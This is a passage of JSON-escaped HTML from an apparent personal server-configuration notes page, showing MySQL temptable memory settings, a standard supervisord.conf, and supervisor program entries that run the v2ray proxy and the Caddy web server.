4GB（記憶體中臨時表）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etemptable_max_mmap\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e42949672960    # 40GB（記憶體映射檔案）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etemptable_use_mmap\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e1              # 啟用記憶體映射\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ev2ray\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"supervisordconf\"\u003esupervisord.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; supervisor config file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[unix_http_server]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/run/supervisor.sock   ; (the path to the socket file)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003echmod\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0700                       ; sockef file mode (default 0700)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[supervisord]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elogfile\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003epidfile\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003echildlogdir\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor            ; (\u0026#39;AUTO\u0026#39; child log dir, default $TEMP)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elogfileMaxbytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e100MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elogfileBackups\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eloglevel\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003edebug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; the below section must remain in the config file for RPC\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; (supervisorctl/web interface) to work, additional interfaces may be\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; added by defining them in separate rpcinterface: sections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[rpcinterface:supervisor]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esupervisor.rpcinterface_factory\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003esupervisor.rpcinterface:make_main_rpcinterface\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[supervisorctl]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eserverurl\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eunix:///var/run/supervisor.sock ; use a unix:// URL  for a unix socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; The [include] section can just contain the \u0026#34;files\u0026#34; setting.  This\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; setting can list multiple files (separated by whitespace or\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; newlines).  It can also contain wildcards.  The filenames are\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; interpreted as relative to this file.  Included files *cannot*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e; include files themselves.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[include]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efiles\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/supervisor/conf.d/*.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"confdv2rayconf\"\u003econf.d/v2ray.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[program:v2ray]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecommand\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/v2ray/bin/v2ray run -config /etc/v2ray/config.json -confdir /etc/v2ray/conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eprocess_name\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ev2ray\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estdout_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/v2ray.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estderr_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/v2ray.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautostart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartretries\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautorestart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eexitcodes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopsignal\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eTERM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopwaitsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ekillasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[program:caddy]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecommand\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/local/bin/caddy run --environ --config /etc/caddy/Caddyfile --adapter caddyfile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eprocess_name\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ecaddy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estdout_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/caddy.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estderr_logfile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/supervisor/caddy.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautostart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estartretries\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eautorestart\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eexitcodes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopsignal\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eTERM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopwaitsecs\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estopasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ekillasgroup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Server-Configs Notes"}]